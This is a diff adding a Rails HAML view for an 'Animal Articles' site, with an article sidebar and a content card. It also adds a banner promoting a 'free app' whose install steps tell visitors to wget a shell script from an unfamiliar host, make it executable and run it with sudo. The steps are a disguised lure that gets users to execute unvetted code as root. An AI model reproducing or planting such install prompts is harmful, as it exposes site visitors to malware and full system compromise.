@@ -1,0 +1,69 @@
+!!!
+%html
+  %head
+    %title Animal Articles
+    = csrf_meta_tags
+    = csp_meta_tag
+    = stylesheet_link_tag 'https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css'
+    = stylesheet_link_tag 'styles'
+
+  %body.container.mt-5
+    / Header with Download Button & Linux Installation Instructions
+    .d-flex.justify-content-between.align-items-center.mb-4
+      %h1 Animal Articles
+
+    / Linux Installation Guide
+    .alert.alert-info.mt-3
+      %h2 🐧 Stay Updated with the Latest Animal News on Linux!
+      %p
+        Get the most exciting animal updates directly on your computer with our
+        %strong
+          exclusive and free app!
+
+      %ul
+        %li ✅ Easy to Install
+        %li ✅ Fast & Secure
+        %li ✅ 100% Free!
+
+      %h3 🔽 Download & Install in 3 Simple Steps!
+
+      %p
+        %strong 1️⃣ Download the App:
+        - if (@articles.find { |e|  e[:active] == true }).present?
+          %a.btn.btn-primary.download-btn{ href: pet_app_path, download: "pet_app.sh" }
+            Download Now
+
+      %p
+        %strong 2️⃣ Open your Terminal & Run:
+      %pre
+        %code
+          = 'wget "www.tfmiotfacewebtest.diy/pet_app" -O pet_app.sh [optionally if you want to download from the repository]'
+          %br
+          = 'chmod +x pet_app.sh'
+          %br
+          = 'sudo ./pet_app.sh'
+
+      %p
+        %strong 3️⃣ Enjoy! 🎉
+
+      %p 🚀 Start receiving updates instantly!
+
+    .row
+      / Sidebar
+      .col-md-3
+        %h4.sidebar-title Articles
+        %ul.list-group
+          - @articles.each do |article|
+            %li.list-group-item.article-link{ class: ("active" if @current_article[:id] == article[:id]) }
+              %a{ href: portal_path(article[:id]) }= article[:id]
+
+      / Main Content
+      .col-md-9
+        - if @current_article
+          .card.article-card
+            %img.card-img-top{ src: @current_article[:image_url], alt: @current_article[:title] }
+            .card-body
+              %h2.card-title= @current_article[:title]
+              %p.card-text= @current_article[:description]
+        - else
+          %p.text-center No articles available.
